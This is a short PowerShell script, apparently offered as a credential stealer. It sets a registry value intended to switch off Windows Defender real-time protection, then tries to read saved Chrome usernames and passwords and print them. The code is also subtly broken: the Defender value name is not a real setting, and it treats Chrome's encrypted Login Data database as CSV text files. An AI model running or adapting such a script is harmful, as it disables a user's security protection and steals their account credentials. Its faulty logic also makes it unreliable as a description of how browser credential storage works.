#Requires -RunAsAdministrator

# Disable Windows Defender for this script execution
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\RealTimeProtection" -Name "DisableSIP" -Value 1 -Type DWord

# Chrome Password Extraction
$ChromePasswdPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $ChromePasswdPath) {
    Get-ChildItem -Path $ChromePasswdPath -Filter "*.csv" -Recurse | ForEach-Object {
        $PasswordData = Get-Content $_.FullName -ErrorAction Stop
        foreach ($PasswordLine in $PasswordData) {
            if ($PasswordLine -match "Username=(.*?)\s+Password=(.*)") {
                $Username = $Matches[1].Trim()
                $Password = $Matches[2].Trim()
                Write-Host "Chrome Username: $Username, Password: $Password"
            }
        }
    }
}

